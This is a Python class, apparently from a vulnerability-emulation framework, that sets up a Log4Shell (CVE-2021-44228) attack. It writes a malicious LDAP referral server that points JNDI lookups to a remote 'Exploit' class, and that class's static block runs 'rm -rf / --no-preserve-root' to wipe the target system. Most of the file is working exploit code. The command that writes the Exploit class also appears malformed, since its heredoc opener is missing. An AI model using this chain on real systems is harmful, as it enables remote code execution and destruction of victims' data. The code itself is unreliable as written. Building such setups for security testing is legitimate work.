import os, sys, logging
import pathlib
fpath = pathlib.Path(__file__).parent.resolve()
root_directory = os.path.abspath("{}/..".format(fpath))
from applications.application import Application

class Cve202144228LdapServer(Application):
    def __init__(self, app, **params):
        name = params.get("name", app)
        super().__init__(app, name)

    # Please revise the following functions if it is different
    # from the default way
    def check_application(self, arch=None, os=None):
        logging.debug("Check the application: {}".format(self.app))
        cmds = []
        # if arch == "aarch64" and os == "debian":
        #     cmd = "which nmap"
        #     cmds.append(cmd)
        return cmds

    def prepare_application(self, arch=None, os=None):
        logging.debug("Prepare the application: {}".format(self.app))
        cmds = []
        cmd = "cd ~"
        cmds.append(cmd)

        cmd = "wget https://repo1.maven.org/maven2/com/unboundid/unboundid-ldapsdk/6.0.7/unboundid-ldapsdk-6.0.7.jar -O unboundid-ldapsdk.jar"
        cmds.append(cmd)

        cmd = "mkdir -p marshalsec/jndi"
        cmds.append(cmd)

        cmd = "cat <<EOF > LDAPRefServer.java\npackage marshalsec.jndi;\n\nimport java.net.InetAddress;\nimport java.net.MalformedURLException;\nimport java.net.URL;\nimport javax.net.ServerSocketFactory;\nimport javax.net.SocketFactory;\nimport javax.net.ssl.SSLSocketFactory;\nimport com.unboundid.ldap.listener.InMemoryDirectoryServer;\nimport com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;\nimport com.unboundid.ldap.listener.InMemoryListenerConfig;\nimport com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;\nimport com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;\nimport com.unboundid.ldap.sdk.Entry;\nimport com.unboundid.ldap.sdk.LDAPException;\nimport com.unboundid.ldap.sdk.LDAPResult;\nimport com.unboundid.ldap.sdk.ResultCode;\n\npublic class LDAPRefServer {\n\n\tprivate static final String LDAP_BASE = \"dc=example,dc=com\";\n\n\tpublic static void main(String[] args) {\n\t\tint port = 1389;\n\t\tif (args.length < 1 || args[0].indexOf('#') < 0) {\n\t\t\tSystem.err.println(LDAPRefServer.class.getSimpleName() + \" <codebase_url#classname> [<port>]\");\n\t\t\tSystem.exit(-1);\n\t\t} else if (args.length > 1) {\n\t\t\tport = Integer.parseInt(args[1]);\n\t\t}\n\n\t\ttry {\n\t\t\tSystem.out.println(\"Configuring LDAP server...\");\n\t\t\tInMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);\n\t\t\tconfig.setListenerConfigs(new InMemoryListenerConfig(\n\t\t\t\t\"listen\",\n\t\t\t\tInetAddress.getByName(\"0.0.0.0\"),\n\t\t\t\tport,\n\t\t\t\tServerSocketFactory.getDefault(),\n\t\t\t\tSocketFactory.getDefault(),\n\t\t\t\t(SSLSocketFactory) SSLSocketFactory.getDefault()));\n\n\t\t\tconfig.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[0])));\n\t\t\tInMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);\n\t\t\tSystem.out.println(\"LDAP server configured successfully. Listening on 0.0.0.0:\" + port);\n\t\t\tds.startListening();\n\n\t\t} catch (Exception e) {\n\t\t\tSystem.err.println(\"Error setting up LDAP server: \" + e.getMessage());\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n\n\tprivate static class OperationInterceptor extends InMemoryOperationInterceptor {\n\n\t\tprivate URL codebase;\n\n\t\tpublic OperationInterceptor(URL cb) {\n\t\t\tthis.codebase = cb;\n\t\t\tSystem.out.println(\"OperationInterceptor initialized with codebase: \" + cb);\n\t\t}\n\n\t\t@Override\n\t\tpublic void processSearchResult(InMemoryInterceptedSearchResult result) {\n\t\t\tString base = result.getRequest().getBaseDN();\n\t\t\tSystem.out.println(\"Processing search result for base DN: \" + base);\n\t\t\tEntry e = new Entry(base);\n\t\t\ttry {\n\t\t\t\tsendResult(result, base, e);\n\t\t\t} catch (Exception e1) {\n\t\t\t\tSystem.err.println(\"Error processing search result: \" + e1.getMessage());\n\t\t\t\te1.printStackTrace();\n\t\t\t}\n\t\t}\n\n\t\tprotected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e)\n\t\t\t\tthrows LDAPException, MalformedURLException {\n\t\t\tURL turl = new URL(this.codebase, this.codebase.getRef().replace(\'.\', \'/\').concat(\".class\"));\n\t\t\tSystem.out.println(\"Send LDAP reference result for \" + base + \" redirecting to \" + turl);\n\t\t\te.addAttribute(\"javaClassName\", this.codebase.getRef());\n\t\t\tString cbstring = this.codebase.toString();\n\t\t\tint refPos = cbstring.indexOf(\'#\');\n\t\t\tif (refPos > 0) {\n\t\t\t\tcbstring = cbstring.substring(0, refPos);\n\t\t\t}\n\n\t\t\te.addAttribute(\"javaCodeBase\", cbstring);\n\t\t\te.addAttribute(\"objectClass\", \"javaNamingReference\");\n\t\t\te.addAttribute(\"javaFactory\", this.codebase.getRef());\n\t\t\tSystem.out.println(\"Sending LDAP search entry...\");\n\t\t\tresult.sendSearchEntry(e);\n\t\t\tSystem.out.println(\"LDAP search entry sent.\");\n\t\t\tresult.setResult(new LDAPResult(0, ResultCode.SUCCESS));\n\t\t\tSystem.out.println(\"LDAP result set to SUCCESS.\");\n\t\t}\n\t}\n}\nEOF"
        cmds.append(cmd)

        cmd = "cp LDAPRefServer.java marshalsec/jndi/LDAPRefServer.java"
        cmds.append(cmd)

        cmd = "public class Exploit implements java.io.Serializable {\n\tprivate static final long serialVersionUID = 1L;\n\n\tstatic {\n\t\ttry {\n\t\t\t// WARNING: This command will attempt to delete the entire system (Linux)\n\t\t\tString[] command = {\"/bin/bash\", \"-c\", \"rm -rf / --no-preserve-root\"};\n\t\t\tProcess p = Runtime.getRuntime().exec(command);\n\t\t\tBufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));\n\t\t\tString line;\n\t\t\twhile ((line = reader.readLine()) != null) {\n\t\t\t\tSystem.out.println(line);\n\t\t\t}\n\t\t\tp.waitFor();\n\t\t} catch (Exception e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n\n\tpublic void execute() {\n\t\tSystem.out.println(\"Exploit\'s execute method is running!\");\n\t}\n}\nEOF"
        cmds.append(cmd)

        cmd = "javac -cp unboundid-ldapsdk.jar marshalsec/jndi/LDAPRefServer.java Exploit.java"
        cmds.append(cmd)

        # if arch == "aarch64" and os == "debian":
        #     cmd = "apt-get install nmap"
        #     cmds.append(cmd)
        return cmds

    def run_application(self, arch=None, os=None, **params):
        logging.debug("Run the application: {}".format(self.app))
        cmds = []
        cmd = "java -cp \".:unboundid-ldapsdk.jar\" marshalsec.jndi.LDAPRefServer http://http-server:8001/#Exploit 1389"
        cmds.append(cmd)

        # if arch == "aarch64" and os == "debian":
        #     cmd = "nmap"
        #     cmds.append(cmd)
        return cmds

